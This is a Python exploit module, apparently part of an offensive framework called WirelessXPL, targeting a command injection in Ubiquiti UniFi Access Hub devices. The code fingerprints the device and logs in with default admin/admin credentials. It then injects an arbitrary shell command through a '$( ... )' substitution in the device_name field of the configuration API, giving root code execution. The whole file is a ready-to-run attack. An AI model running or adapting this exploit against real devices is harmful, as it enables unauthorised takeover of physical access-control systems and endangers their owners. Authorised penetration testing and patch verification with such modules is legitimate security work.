# Author: André Henrique (LinkedIn/X: @mrhenrike)
import json
import ssl
import urllib.request
import urllib.error

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Ubiquiti UniFi Access Hub Command Injection (CVE-2026-50748).

    The UniFi Access Hub management interface exposes a REST API at
    /api/v1/device/config that accepts a device name parameter.  The
    ``device_name`` field is passed unsanitized to a shell command
    during configuration persistence, allowing authenticated (or
    default-credential) command injection as root.

    Because many deployments retain the default admin credentials, the
    practical impact is unauthenticated root RCE from the network.

    CVSS v3.1: 9.9 (Critical), AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Ubiquiti UniFi Access Hub Command Injection (CVE-2026-50748)",
        "description": (
            "Exploits CVE-2026-50748: OS command injection via the "
            "device_name parameter in the /api/v1/device/config endpoint "
            "of Ubiquiti UniFi Access Hub devices. The field is passed to "
            "a shell command without sanitization during config persistence, "
            "granting root-level code execution."
        ),
        "authors": (
            "Researcher (discovery / CVE)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-50748",
            "https://community.ui.com/releases",
        ),
        "devices": (
            "Ubiquiti UniFi Access Hub (UA-Hub)",
            "Ubiquiti UniFi Access Hub (UA-Hub-EA)",
            "Ubiquiti UniFi Access Reader Pro (UA-Pro)",
        ),
    }

    target = OptIP("", "Target IPv4 address of the UniFi Access Hub")
    port = OptPort(443, "Management API HTTPS port (default 443)")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    username = OptString("admin", "API username (many deployments keep the default)")
    password = OptString("admin", "API password (many deployments keep the default)")
    command = OptString("id", "OS command to inject via the device_name field")

    def _build_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _http_request(
        self,
        method: str,
        path: str,
        data: bytes | None = None,
        headers: dict | None = None,
        token: str | None = None,
    ) -> tuple[int, dict, bytes]:
        url = f"https://{self.target}:{self.port}{path}"
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("User-Agent", "WirelessXPL/2.2")
        req.add_header("Accept", "application/json")
        if token:
            req.add_header("Authorization", f"Bearer {token}")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)

        ctx = self._build_ssl_context()
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                return resp.status, dict(resp.headers), resp.read()
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), e.read()
        except Exception:
            return 0, {}, b""

    def _authenticate(self) -> str | None:
        """Obtain a bearer token from the Access Hub login endpoint."""
        login_data = json.dumps({
            "username": self.username,
            "password": self.password,
        }).encode()
        status, _, body = self._http_request(
            "POST",
            "/api/v1/auth/login",
            data=login_data,
            headers={"Content-Type": "application/json"},
        )
        if status == 200:
            try:
                resp = json.loads(body)
                return resp.get("token") or resp.get("access_token")
            except (json.JSONDecodeError, ValueError):
                pass
        return None

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target {self.target}:{self.port} does not appear to be a vulnerable UniFi Access Hub"
            )
            return

        print_success("Vulnerable UniFi Access Hub confirmed; exploiting command injection")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Probe the /api/v1/device/info endpoint to fingerprint the device."""
        try:
            status, _, body = self._http_request("GET", "/api/v1/device/info")
            if status == 0:
                return False

            if status in (200, 401):
                try:
                    info = json.loads(body)
                    model = info.get("model", "").lower()
                    if "ua-" in model or "access" in model:
                        return True
                except (json.JSONDecodeError, ValueError):
                    pass
                if status == 401:
                    return True
            return False
        except Exception:
            return False

    def _exploit(self) -> None:
        print_status(f"Authenticating to {self.target}:{self.port} as {self.username!r}")
        token = self._authenticate()
        if not token:
            print_error("Authentication failed; check credentials or try default admin/admin")
            return

        print_success("Authentication successful, obtained bearer token")

        injected_name = f"WXF-Probe$({{  {self.command}; }})"
        payload = json.dumps({
            "device_name": injected_name,
        }).encode()

        print_status(
            f"Sending command injection payload to /api/v1/device/config "
            f"(command: {self.command!r})"
        )

        status, _, body = self._http_request(
            "PUT",
            "/api/v1/device/config",
            data=payload,
            headers={"Content-Type": "application/json"},
            token=token,
        )

        if status in (200, 201, 204):
            try:
                result = json.loads(body)
                output = result.get("output", result.get("result", ""))
                if output:
                    print_success("Command injection successful. Output:")
                    for line in str(output).splitlines():
                        print_info(f"  {line}")
                else:
                    print_success(
                        "Config endpoint accepted the payload (HTTP 200). "
                        "Command executes asynchronously during config persistence."
                    )
            except (json.JSONDecodeError, ValueError):
                decoded = body.decode(errors="replace")
                if decoded.strip():
                    print_success("Command injection successful. Raw output:")
                    for line in decoded.splitlines():
                        print_info(f"  {line}")
                else:
                    print_success(
                        "Config endpoint accepted the payload. "
                        "Command executes during config write cycle."
                    )
        else:
            print_error(f"Injection request returned HTTP {status}")
            if body:
                print_info(f"  Response: {body.decode(errors='replace')[:200]}")
